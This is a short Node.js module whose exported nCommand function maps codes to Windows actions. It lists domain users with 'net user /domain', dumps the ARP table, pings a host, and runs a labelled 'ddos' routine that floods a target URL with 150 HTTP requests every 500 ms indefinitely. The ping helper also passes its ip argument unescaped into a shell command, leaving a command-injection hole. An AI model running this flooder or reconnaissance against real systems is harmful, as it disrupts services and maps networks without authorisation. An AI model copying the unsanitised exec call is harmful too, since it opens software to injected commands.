
var os = require("os");
var { exec } = require("child_process");
var req = require("request")


function forUserWindows() {
    exec("net user /domain", function (err, data, getter) {
        if (err) {
            console.log(err)
        }
        if (data) {
            console.log(data)
        }
        if (getter) {
            console.log(getter)
        }
    })
}


function pingSending(ip) {
    exec("ping " + ip, function (err, data, getter) {
        if (err) {
            console.log(err)
        }
        if (data) {
            console.log(data)
        }
        if (getter) {
            console.log(getter)
        }
    })
}

const dos = (url, qty, ms) => {

    let err = ok = 0
    setInterval(_ => {

        for (let i = qty; i--;)

            req(url, error => !error ? ok++ : err++)
            console.log(`result:' ${ok} ${err}`)
            err = ok = 0

    }, ms) //Usage Code example: https://github.com/u4bi-store/dos/blob/master/index.js thanks :) 
}


function ddosTesting(urlip) {
    dos(urlip, 150, 500)
}



function arpList() {
    exec("arp -a", function (err, data, getter) {
        if (err) {
            console.log(err)
        }
        if (data) {
            console.log(data)
        }
        if (getter) {
            console.log(getter)
        }
    })
}


module.exports.nCommand = function (parameter, ip) {
    var sysType = os.platform();
    var chkinp = parameter
    if (sysType == "win32") {

        if (chkinp == "PL") {
            pingSending(ip)
        } else if (chkinp == "UL") {
            forUserWindows()
        } else if (chkinp == "AL") {
            arpList()
        } else if (chkinp == "DD") {
            ddosTesting(ip)
        }
        else {
            console.log("Error parameters")
        }

    }
    else {
        console.log("Linux veya başka bir sistem.")
    }
}

